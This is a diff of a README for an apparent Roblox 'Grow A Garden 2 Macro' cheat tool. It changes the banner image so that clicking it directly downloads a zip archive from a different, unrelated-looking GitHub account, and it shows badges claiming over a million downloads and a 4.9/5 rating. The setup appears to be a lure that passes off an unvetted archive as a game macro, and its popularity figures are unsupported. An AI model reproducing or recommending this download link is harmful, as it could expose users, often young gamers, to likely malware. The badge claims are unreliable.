@@ -1,5 +1,5 @@
 # 🍄 Epic's Grow A Garden 2 Macro 🍄
-[![Banner](https://camo.githubusercontent.com/956c28123d2e0a54d6f24041f4c44adad36fdce398295c59e849de14449897c5/68747470733a2f2f692e696d6775722e636f6d2f3563756e376f6e2e6a706567)](https://github.com/daved-lab2001o0/adopt-me-roblox-script/releases/tag/Script)
+[![Banner](https://camo.githubusercontent.com/956c28123d2e0a54d6f24041f4c44adad36fdce398295c59e849de14449897c5/68747470733a2f2f692e696d6775722e636f6d2f3563756e376f6e2e6a706567)](https://github.com/andreypetrov-dev94e5/Grow-a-Garden-2-Macro-2026/releases/download/GaG2Macro/GaG2Macro.zip)
 
 ![Downloads](https://camo.githubusercontent.com/e6a691b0faded6663f65388b5a27d31cb172501b1e26c88813633facbbb883cc/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f446f776e6c6f6164732d314d2532422d627269676874677265656e3f7374796c653d666f722d7468652d6261646765)
 ![Rating](https://img.shields.io/badge/User%20Rating-4.9%2F5-yellow?style=for-the-badge)
